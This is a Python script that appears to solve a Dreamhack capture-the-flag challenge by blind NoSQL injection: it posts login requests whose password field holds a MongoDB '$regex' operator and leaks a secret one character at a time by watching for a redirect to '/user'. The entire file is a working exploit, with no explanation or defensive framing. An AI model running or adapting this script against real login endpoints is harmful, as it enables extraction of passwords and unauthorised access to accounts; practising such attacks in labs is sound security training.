import httpx
import time
import re

# ascii_list = ['~','|','$',' ', '!', '"', '#',  '%', '&', "'", '(', ')', '*', '+', ',', '-', '.', '/', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9', ':', ';', '<', '=', '>', '?', '@', 'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z', '[', '\\', ']', '^', '_', '`', 'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z', '{', '}']
# ascii_list =['0', '1', '2', '3', '4', '5', '6', '7', '8', '9', 'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z', '{', '}'
# '~','|','$',' ', '!', '"', '#',  '%', '&', "'", '(', ')', '*', '+', ',', '-', '.', '/',
# '[', '\\', ']', '^', '_', '`',
# 'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z',
# ]
# ascii_list.reverse()
ascii_list = []
for i in range(0x20, 0x7f):
    ascii_list.append(chr(i))

# url = "http://localhost:3000/login"
# user = "testuser"
user = "cream"
url = "http://host3.dreamhack.games:19957/login"
def attempt(known: str) -> str:
    for c in ascii_list:
        time.sleep(0.2)
        print(c, end="", flush=True)
        payload = "^"
        # payload += ".*"
        payload += re.escape(known)
        payload += re.escape(c)
        # payload += "}"
        json = {"uid": user, "upw": {"$regex": payload} }
        resp = httpx.post(url=url, json=json)
        # print(json)
        if "/user" in resp.text:
            print("")
            return c
    print("nothing")
    exit()

# known = "DH{0da0d81e54f57b"
known = "e1b67"
while True:
    try:
        known += attempt(known)
    except httpx.ConnectTimeout:
        print("timeout! please wait a 10 second")
        time.sleep(10)
        continue
    # known = attempt(known) + known
    print(f"leaked: {known} ({len(known)})")
